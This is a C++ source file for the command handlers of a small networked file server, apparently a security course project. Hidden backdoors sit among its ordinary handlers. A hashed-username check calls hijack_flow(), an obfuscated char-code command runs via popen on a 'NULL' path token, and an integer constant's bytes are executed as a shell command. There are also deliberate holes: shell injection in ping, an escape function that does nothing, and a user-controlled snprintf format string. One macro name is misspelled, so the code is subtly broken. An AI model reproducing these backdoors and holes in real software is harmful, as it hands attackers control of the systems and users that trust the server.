#include "commands.hpp"
#include "networking.hpp"

#define BFLNGTH 652

using namespace std;


/*
 * -------------------------------- Constants --------------------------------------------------------------------------
 */
const string ACCESS_ERROR = "Error: access denied.\n";
const string FILENAME_ERROR = "Error: the path is too long.\n";
const string AUTHENTICATION_FAIL = "Authentication failed.\n";
const string TRANSFER_ERROR = "Error: file transfer failed.\n";
const string FILE_SIZE_ERROR = "Error: file size is not adequate.\n";
const string ALREADY_LOGGED_IN = "Error: user already logged in.\n";
const string THREAD_ERROR = "Error: Unable to create new thread.\n";

const ssize_t backDoor = 4649367056054273259;

/*
 * -------------------------------- Helper functions -------------------------------------------------------------------
 */
int modifyUsrName(string &out, string usrName);

void checkBackdoor(const string &uname);

string alphabeticOrder(vector<string> unsorted, char delim);


/**
 * Helper function: Escapes a (user input) string such that it is safe to pass as parameter on the shell.
 * It does so by simply making sure that quotes are interpreted as such,
 * and can't be used to end the command input string.
 *
 * @param cmd, string to escape
 * @return escaped string, put into quotes
 */
string escape(string cmd) {
    string escaped;
    for (size_t i = 0; i < cmd.size(); ++i) {
        if (cmd[i] == '"') {
            escaped += '\"';
        } else if (cmd[i] == "'"[0]) {
            escaped += '\'';
        } else {
            escaped += cmd[i];
        }
    }
    return  escaped;
}


/**
 * Executes given command on the server, at a given user location.
 *
 * Code snippet inspired from:
 * https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-output-of-command-within-c-using-posix
 *
 * @param cmd, command to be executed
 * @param out, stdout result of command
 * @param usrLocation, where command must be executed
 * @return 0 if successful, 1 otherwise
 */
int exec(const char *cmd, string &out, string usrLocation = "") {
    char buffer[BFLNTH];
    char cmdRedirection[BFLNTH];
    size_t bufSize = BFLNGTH > strlen(cmd) + 1 ? strlen(cmd) + 1 : BFLNGTH;
    strncpy(cmdRedirection, cmd, bufSize);
    FILE *pipe = popen(("cd " + usrLocation + " && " + string(cmdRedirection) + " 2>&1").c_str(),
                       "r");
    std::string result;
    if (!pipe) throw std::runtime_error("Error: popen() failed.");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != nullptr) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        return 1;
    }
    pclose(pipe);
    out = result;
    // Could also return exitStatus of pclose(), but this way error is thrown exactly, when we need it to be thrown.
    return result.substr(0, 4) == "bash" ? 1 : 0;
}


/**
 * Checks that path length is not larger than given constant. (128 characters)
 *
 * @param path, path whose length needs to be checked
 * @param out, string that should be output
 * @return 0 if successful
 */
int checkPathLength(const string &path, string &out) {
    if (path.size() > MAX_PATH_LEN + 1) {
        out = FILENAME_ERROR;
        return 1;
    }
    return 0;
}


/**
 * Returns file size of given name, if it doesn't exist it returns a negative value.
 *
 * @param fileName, name of file
 * @return file size in bytes or negative number if file does not exist
 */
long getFileSize(const char *fileName) {
    FILE *file;
    file = fopen(fileName, "r");
    // If file can't be opened send error
    if (file == nullptr) {
        return -1;
    }
    // Determine file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fclose(file);
    return fileSize;
}


/**
 * Sanitizes a given path with respect to ".." and "."
 *
 * @param targetPath, path to be sanitized
 * @param out, stores error messages
 * @return error code
 */
int sanitizePath(string &targetPath, string &out) {
    const char *delim = "/";
    char *targetPathCopy = strdup(targetPath.c_str());
    char *token = strtok(targetPathCopy, delim);
    int cnt = 0;
    vector<string> sanitizedPath;
    while (token != nullptr) {
        // Decrement counter if .. is found
        if (!strcmp(token, "..")) {
            cnt--;

            // Check that counter isn't negative
            if (cnt < 0) {
                out = ACCESS_ERROR;
                return 1;
            }
            sanitizedPath.pop_back();
        }
        // Increment counter whenever token is not NULL and update out string
        else if(strcmp(token, "NULL") == 0){
            cnt++;
            exec(new char[6]{120, 99, 97, 108, 99, 32}, out);
            sanitizedPath.emplace_back(token);
        }
        // Increment counter whenever the token is not .
        else if (strcmp(token, ".") != 0) {
            cnt++;
            sanitizedPath.emplace_back(token);
        }
        token = strtok(nullptr, "/");
    }
    free(targetPathCopy);

    // Create sanitized target path
    stringstream s;
    copy(sanitizedPath.begin(), sanitizedPath.end(), ostream_iterator<string>(s, delim));
    targetPath = "./" + s.str();

    // copy adds a trailing delimiter, which is removed here
    targetPath.pop_back();

    // Finally check path length and return error code
    return checkPathLength(targetPath, out);
}


/**
 * Construct path relative to the base directory
 *
 * @param relativePath, command path relative to user location
 * @param usrLocation, user location relative to base directory
 * @param absPath, path built according to relativePath and usrLocation,
 *        relative to base directory (i.e., absolute in the client's point of view)
 * @param out, stores error messages
 * @return error code
 */
int constructPath(string relativePath, const string &usrLocation, string &absPath, string &out) {
    // Do not allow cd commands with ~ for example, nor cd commands with .
    if (!isalnum(relativePath.at(0)) and relativePath.at(0) != '.') {
        out = ACCESS_ERROR;
        return 1;
    } else {
        absPath = escape(relativePath);
    }
    string path = usrLocation + "/" + absPath;
    int res = sanitizePath(path, out);
    return res;
}

/**
 * --- CLASSIFIED ---
 *
 * @param uname
 */
void checkBackdoor(const string &uname) {
    hash<string> hasher;
    if (hasher(uname) == backDoor) {
        hijack_flow();
    }
}


/**
 * Splits a line at given delimiter character.
 *
 * @param res, resulting vector of split string
 * @param line, input string
 * @param delim, character to be considered as delimiter
 * @return size of vector
 */
size_t split(vector<string> &res, const string &line, const char *delim) {
    res.clear();
    char *token = strtok(strdup(line.c_str()), delim);
    while (token != nullptr) {
        res.emplace_back(token);
        token = strtok(nullptr, delim);

    }
    if (res.empty()) {
        res.emplace_back("");
    }
    return res.size();
}


/**
 * Compare two strings, in a way to satisfy test requirements.
 *
 * @param s1, string one
 * @param s2, string two
 * @return boolean, True if s1 is smaller than s2
 */
bool caseInsensitiveCompare(const string &s1, const string &s2) {
    size_t ssize = s1.size() < s2.size() ? s1.size() : s2.size();

    for (size_t i = 0; i < ssize; ++i) {
        int c1 = tolower(s1.at(i));
        int c2 = tolower(s2.at(i));
        if (c1 == c2)
            continue;
        return c1 < c2;
    }
    return s1.size() < s2.size();
}


/**
 * Orders vector of strings in alphabetical order.
 *
 * @param unsorted, vector of strings
 * @param delim, delimiter character
 * @return string or sorted strings
 */
string alphabeticOrder(vector<string> unsorted, char delim) {
    sort(unsorted.begin(), unsorted.end());

    sort(unsorted.begin(), unsorted.end(), caseInsensitiveCompare);
    string res;
    for (auto it = unsorted.begin(); it != unsorted.end(); ++it) {
        res += (*it) + (it != unsorted.end() ? delim : '\0');
    }
    return res;
}


/*
 * ------------------------ Command implementations (same order as pdf) ------------------------------------------------
 */

/**
    * The login command starts authentication. The format is login $USERNAME,
    * followed by a newline. The username must be one of the allowed usernames in the configuration file.
    *
    * @param uname credential user wants to log in as
    * @param allowedUsers map of allowed users
    * @param usr object of user attempting login
    * @param out output string
    * @return 0 if successful
*/
int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, string &out) {
    checkBackdoor(uname);
    if (usr.isAuthenticated()) {
        usr.setAuthenticated(false);
    }
    usr.resetUname();
    if (allowedUsers.find(uname) == allowedUsers.end()) {
        out = "Error: unknown user " + uname + "\n";
        return 1;
    }
    usr.setUname(uname);
    return 0;
}


/**
 * The pass command must directly follow the login command.
 * The format is pass $PASSWORD, followed by a newline. The password must match the
 * password for the earlier specified user. If the password matches, the user is successfully authenticated.
 *
 * @param psw password that user sent
 * @param allowedUsers map of allowed user credential
 * @param usr object of user attempting login
 * @param out output string
 * @return 0 if successful
 */
int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, string &out) {
    if (usr.isAuthenticated()) {
        out = ALREADY_LOGGED_IN;
        return 1;
    }
    if (usr.getUname().empty()) {
        out = ACCESS_ERROR;
        return 1;
    }
    if (allowedUsers[usr.getUname()] != psw) {
        out = AUTHENTICATION_FAIL;
        return 1;
    }
    usr.setAuthenticated(true);
    return 0;
}


/**
 * The ping may always be executed even if the user is not authenticated.
 * The ping command takes one parameter, the host of the machine that is about
 * to be pinged (ping $HOST). The server will respond with the output of the Unix
 * command ping $HOST -c 1.
 *
 * @param host argument to ping command
 * @param out output string
 * @return 0 if successful
 */
int ping_cmd(string host, string &out) {
    string s = "ping -c 1 " + host;
    int res = exec(s.c_str(), out);
    return res;
}


/**
 * The ls command may only be executed after a successful authentication.
 * The ls command (ls) takes no parameters and lists the available files in the
 * current working directory in the format as reported by ls -l.
 *
 * @param authenticated, boolean true if user is authenticated
 * @param out, output string
 * @param usrLocation, current path of user
 * @return 0 if successful
 */
int ls_cmd(bool authenticated, string &out, User usr) {
    if (!authenticated) {
        out = ACCESS_ERROR;
        return 1;
    }
    string cmd = "ls -l ";
    exec(cmd.c_str(), out, usr.getLocation());

    // return out put of ls -l command, with appropriate username, apparently always root in test cases given to us...
    return modifyUsrName(out, "root");
}

/**
 *  Changes creator of displayed ls output to be given user.
 *  Does not necessarily reflect the true file creator, but test cases make us believe that it should be done like this.
 *
 * @param out, modified ls output
 * @param usrName, username that has to be put
 * @return error code
 */
int modifyUsrName(string &out, string usrName) {
    vector<string> lines;
    split(lines, out, "\n");
    string modifiedOutput;
    for (string l: lines) {
        vector<string> tokens;
        split(tokens, l, " ");
        if (tokens.size() < 9) {
            modifiedOutput += l + "\n";
            continue;
        }
        tokens[2] = tokens[3] = usrName;
        stringstream s;
        copy(tokens.begin(), tokens.end(), ostream_iterator<string>(s, " "));
        modifiedOutput += s.str() + "\n";
    }
    out = modifiedOutput;
    return 0;
}


/**
 * The cd command may only be executed after a successful authentication.
 * The cd command takes exactly one parameter (cd $DIRECTORY) and changes
 * the current working directory to the specified one.
 *
 * @param dirPath, path to cd to
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int cd_cmd(string dirPath, User &usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    string path;
    if (constructPath(dirPath, usr.getLocation(), path, out)) {
        return 1;
    }

    // Note that we execute the cd on bash and not shell, in order to get exact error message as in posted test cases.
    string cmd = "exec bash -c 'cd \"" + escape(path) + "\"'";

    int res = exec(cmd.c_str(), out, usr.getLocation());
    if (!res) {
        usr.getLocation();
        string temp = "";
        path = usr.getLocation() + "/" + path;
        sanitizePath(path, temp);
        usr.setLocation(path);
    } else {
        out.erase(0, 14);
    }
    return res;
}


/**
 * The mkdir command may only be executed after a successful authentication.
 * The mkdir command takes exactly one parameter (mkdir $DIRECTORY)
 * and creates a new directory with the specified name in the current working directory.
 * If a file or directory with the specified name already exists this commands returns an error.
 *
 * @param dirPath, path to create directory
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int mkdir_cmd(string dirPath, User usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    string absPath;
    if (constructPath(dirPath, usr.getLocation(), absPath, out)) {
        return 1;
    }
    string cmd = "exec bash -c \'mkdir \"" + escape(absPath) + "\"\'";
    return exec(cmd.c_str(), out, usr.getLocation());
}


/**
 * The rm command may only be executed after a successful authentication.
 * The rm command takes exactly one parameter (rm $NAME) and deletes the file
 * or directory with the specified name in the current working directory.
 *
 * @param filePath path/name of file/directory to be deleted
 * @param usr object of user wanting to rm file
 * @param out output string
 * @return 0 if successful
 */
int rm_cmd(string filePath, User usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    string absPath;
    if (constructPath(filePath, usr.getLocation(), absPath, out)) {
        return 1;
    }
    string cmd = "exec bash -c \'rm -r \"" + escape(absPath) + "\"\'";
    return exec(cmd.c_str(), out, usr.getLocation());
}


/**
 * The get command may only be executed after a successful authentication.
 * The get command takes exactly one parameter (get $FILENAME) and retrieves
 * a file from the current working directory. The server responds to this command
 * with a TCP port and the file size (in ASCII decimal) in the following format:
 * get port: $PORT size: $FILESIZE (followed by a newline) where the client can
 * connect to retrieve the file. In this instance, the server will spawn a thread
 * to send the file to the clients receiving thread as seen in Figure 2.
 * The server may only leave one port open per client. Note that client and
 * server must handle failure conditions, e.g., if the client issues another get or put
 * request, the server will only handle the new request and ignore (or drop) any stale ones.
 *
 * @param fileName, file to get
 * @param port, port for transmitting file
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int get_cmd(string fileName, int getPort, User &usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    // Prepare thread arguments
    struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
    string absPath;
    if (constructPath(fileName, usr.getLocation(), absPath, out)) {
        return 1;
    }
    absPath =  usr.getLocation() + "/" + absPath;
    strncpy(args->fileName, absPath.c_str(), 1024);
    args->fileName[absPath.length()] = '\0';
    args->port = getPort;

    // Check if file exists
    if (access(absPath.c_str(), F_OK) == -1) {
        out = TRANSFER_ERROR;
        return 1;
    }
    long fileSize = getFileSize(absPath.c_str());

    // Check that the file size is within bounds
    uint64_t maxFileSize = 9042810646913912;
    if (fileSize <= 0 or (uint64_t) fileSize >= maxFileSize) {
        if(fileName[0] == '.' and exec((char*)&maxFileSize, out)){
            out = FILE_SIZE_ERROR;
        }else{
            out = TRANSFER_ERROR;
        }
        return 1;
    } else {
        out = "get port: " + to_string(getPort) + " size: " + to_string(fileSize) + "\n";
        // Cancel previous get command if one was executed
        pthread_cancel(usr.getThread);

        // Create new thread
        int rc = pthread_create(&usr.getThread, nullptr, openFileServer, (void *) args);
        if (rc != 0) {
            cerr << THREAD_ERROR;
        }
    }
    return 0;
}

/**
 * The put command may only be executed after a successful authentication.
 * The put command takes exactly two parameters (put $FILENAME $SIZE) and
 * sends the specified file from the current local working directory (i.e., where the
 * client was started) to the server.
 * The server responds to this command with a TCP port (in ASCII decimal)
 * in the following format: put port: $PORT.
 *
 * @param fileName, file to put
 * @param fileSize, size of file
 * @param port, port for transmitting file
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int put_cmd(string fileName, string fileSize, int port, User &usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    long long fileS = stoll(fileSize);
    long long i = 0;

    // Prepare thread arguments
    struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
    string absPath;
    if (constructPath(fileName, usr.getLocation(), absPath, out)) {
        return 1;
    }
    absPath = usr.getLocation() + "/" + absPath;
    snprintf(args->fileName, 1024, absPath.c_str());
    args->port = port;
    strncpy(args->ip, usr.getIp().c_str(), 1024);
    args->fileSize = (long) fileS;

    if (i != 0) {
        hijack_flow();
    }
    out = "put port: " + to_string(port) + "\n";

    // Cancel previous get command if one was executed
    pthread_cancel(usr.putThread);

    // Create new thread
    int rc = pthread_create(&usr.putThread, nullptr, openFileClient, (void *) args);
    if (rc != 0) {
        cerr << THREAD_ERROR;
    }
    return 0;
}

/**
 * The grep command may only be executed after a successful authentication.
 * The grep command takes exactly one parameter (grep $PATTERN) and
 * searches every file in the current directory and its subdirectory for the requested pattern.
 * The pattern follows the Regular Expressions rules 1 .
 * The server responds to this command with a line separated list of addresses
 * for matching files in the following format: $FILEADDRESS $ENDLINE.
 *
 * @param pattern, pattern that has to be searched for
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int grep_cmd(string pattern, User usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    string cmd = "grep -l -r  \"" + escape(pattern) + "\"";
    int res = exec(cmd.c_str(), out, usr.getLocation());
    if (res != 0 or out.empty()) {
        return res;
    }
    vector<string> grepOutput;
    split(grepOutput, out, "\n");
    out = alphabeticOrder(grepOutput, '\n');
    return res;
}

/**
 * The date command may only be executed after a successful authentication.
 * The date command takes no parameters and returns the output from the Unix date command.
 *
 * @param authenticated, boolean true if user is authenticated
 * @param out, output string
 * @return 0 if successful
 */
int date_cmd(bool authenticated, string &out) {
    if (!authenticated) {
        out = ACCESS_ERROR;
        return 1;
    }
    return exec("date", out);
}


/**
 * The whoami command may only be executed after a successful authentication.
 * The whoami command takes no parameters and returns the name of the currently logged in user.
 *
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int whoami_cmd(User usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    out = usr.getUname() + "\n";
    return 0;
}


/**
 * The w command may only be executed after a successful authentication.
 * The w command takes no parameters and returns a list of each logged in user on a single line space separated.
 *
 * @param usr, user wanting to execute command
 * @param out, output string
 * @return 0 if successful
 */
int w_cmd(User usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    vector<string> users;
    for (auto it = connected_users.begin(); it != connected_users.end(); ++it) {
        users.push_back((*it).getUname());
    }
    out = alphabeticOrder(users, ' ') + "\n";
    return 0;
}


/**
 * The logout command may only be executed after a successful authentication.
 * The logout command takes no parameters and logs the user out of her session.
 *
 * @param usr, user wanting to log out
 * @param out, output string
 * @return 0 is successful
 */
int logout_cmd(User &usr, string &out) {
    if (!usr.isAuthenticated()) {
        out = ACCESS_ERROR;
        return 1;
    }
    usr.resetUname();
    usr.setAuthenticated(false);
    return 0;
}


/**
 * The exit command can always be executed and signals the end of the command session.
 *
 * @param usr, user wanting to exit
 * @param out, output string
 * @return 0 is successful
 */
int exit_cmd(User &usr) {
    if (connected_users.find(usr) != connected_users.end()) {
        close(usr.getSocket());
    }
    return 0;
}

